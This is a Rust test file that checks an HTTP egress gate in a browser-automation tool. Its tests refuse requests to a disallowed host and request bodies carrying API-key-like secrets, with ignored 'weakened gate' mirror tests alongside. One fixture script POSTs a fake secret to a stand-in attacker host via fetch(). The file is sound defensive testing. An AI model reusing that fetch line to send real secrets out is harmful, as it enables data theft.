//! A13 — HTTP egress: script-fetch + dump-original refuse at real call sites.

use std::sync::Arc;

use glass_govern::{gate_http_outbound, HttpGateAction};
use obscura_browser::{BrowserContext, Page};
use obscura_mcp::glass::gate_mcp_navigate;
use serde_json::Value;
use tempfile::tempdir;
use url::Url;

fn setup() {
    let dir = tempdir().unwrap();
    std::env::set_var("OMNIS_GLASS_STATE_DIR", dir.path());
    std::env::set_var(
        "TERMINUS_AUTHORIZE",
        concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/../../scripts/terminus-authorize.mjs"
        ),
    );
    std::env::set_var("OMNIS_GLASS_LANE", "browse:research");
    std::env::set_var("OMNIS_GLASS_ENFORCE", "enforce");
}

#[test]
fn a13_disallowed_host_refused_at_http_boundary() {
    setup();
    let url = Url::parse("https://evil.example/data").unwrap();
    let err = gate_http_outbound(&url, None, HttpGateAction::DumpOriginal, "a13", false);
    assert!(err.is_err(), "disallowed host must REFUSE");
}

#[test]
fn a13_private_network_opt_in_still_refuses_disallowed_public_host() {
    setup();
    let url = Url::parse("https://evil.example/data").unwrap();
    let err = gate_http_outbound(&url, None, HttpGateAction::ScriptFetch, "a13", true);
    assert!(
        err.is_err(),
        "allow_private_network must not bypass lane/host/TERMINUS for public evil host"
    );
}

#[test]
fn a13_secret_body_refused_at_http_boundary() {
    setup();
    let url = Url::parse("https://example.com/post").unwrap();
    let secret = b"sk-abcdefghijklmnopqrstuvwxyz1234567890";
    let err = gate_http_outbound(&url, Some(secret), HttpGateAction::ScriptFetch, "a13", false);
    assert!(err.is_err(), "secret in fetch body must REFUSE");
}

/// Page `fetch()` via `op_fetch_url` — not the gate helper alone.
#[tokio::test(flavor = "current_thread")]
async fn a13_script_fetch_disallowed_host_refused_on_page() {
    setup();
    std::env::set_var("OMNIS_GLASS_HTTP_ACTION", "script-fetch");
    let context = Arc::new(BrowserContext::with_storage_and_network(
        "a13-fetch".into(),
        None,
        false,
        None,
        None,
        false,
    ));
    let mut page = Page::new("a13-page".into(), context);
    page.navigate("data:text/html,<body id=b></body>")
        .await
        .expect("fixture page");

    page.evaluate(
        r#"(function () {
            document.body.setAttribute('data-fetch', 'pending');
            fetch('https://evil.example/data', {
                method: 'POST',
                body: 'sk-abcdefghijklmnopqrstuvwxyz1234567890',
            })
                .then(function (r) {
                    document.body.setAttribute(
                        'data-fetch',
                        r.status === 0 ? 'blocked' : 'ok:' + r.status
                    );
                })
                .catch(function () {
                    document.body.setAttribute('data-fetch', 'blocked');
                });
        })()"#,
    );

    for _ in 0..30 {
        page.settle(50).await;
        let status = page.evaluate("document.body.getAttribute('data-fetch')");
        if status != Value::String("pending".into()) {
            assert_ne!(
                status,
                Value::String("ok:200".into()),
                "evil.example fetch must not succeed"
            );
            assert!(
                status.as_str().map(|s| s.starts_with("blocked") || s.starts_with("ok:0"))
                    .unwrap_or(false),
                "expected blocked fetch, got {status}"
            );
            return;
        }
    }
    panic!("timed out waiting for fetch to settle");
}

#[test]
#[ignore = "can-fail mirror — run with --ignored; must fail when gate is live"]
fn a13_WEAKEN_would_allow_secret() {
    setup();
    let url = Url::parse("https://example.com/post").unwrap();
    let result = gate_http_outbound(
        &url,
        Some(b"sk-abcdefghijklmnopqrstuvwxyz1234567890"),
        HttpGateAction::ScriptFetch,
        "a13",
        false,
    );
    assert!(result.is_ok(), "WEAKEN: weakened gate would allow secret body");
}

#[test]
#[ignore = "can-fail mirror — run with --ignored; must fail when gate is live"]
fn a13_WEAKEN_mcp_navigate_would_allow_evil_host() {
    setup();
    let result = gate_mcp_navigate("https://evil.example/page");
    assert!(result.is_ok(), "WEAKEN: weakened gate would allow evil host");
}
